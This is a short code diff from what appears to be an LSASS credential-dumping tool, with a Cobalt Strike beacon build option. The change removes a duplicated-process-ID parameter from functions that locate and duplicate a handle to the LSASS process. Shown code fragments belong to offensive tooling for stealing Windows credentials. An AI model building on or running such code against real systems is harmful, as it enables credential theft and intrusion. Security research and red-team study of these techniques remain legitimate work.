@@ -44,8 +44,7 @@ HANDLE obtain_lsass_handle(
     BOOL fork,
     BOOL use_seclogon,
     BOOL is_seclogon_stage_2,
-    LPCSTR dump_name,
-    PDWORD duplicated_pid
+    LPCSTR dump_name
 )
 {
     HANDLE hProcess = NULL;
@@ -64,8 +63,7 @@ HANDLE obtain_lsass_handle(
     {
         hProcess = duplicate_lsass_handle(
             pid,
-            permissions,
-            duplicated_pid
+            permissions
         );
     }
     // good old NtOpenProcess
@@ -354,14 +352,12 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     DWORD lsass_pid,
-    DWORD permissions,
-    PDWORD duplicated_pid
+    DWORD permissions
 )
 {
     NTSTATUS status;
     BOOL success;
 
-    *duplicated_pid = 0;
     ULONG ProcesTypeIndex = 0;
     success = GetTypeIndexByName(&ProcesTypeIndex);
     if (!success)
@@ -443,7 +439,6 @@ HANDLE duplicate_lsass_handle(
             if (is_lsass(hDuped))
             {
                 // found LSASS handle
-                *duplicated_pid = handleInfo->UniqueProcessId;
 #ifdef BOF
                 BeaconPrintf(CALLBACK_OUTPUT,
 #else
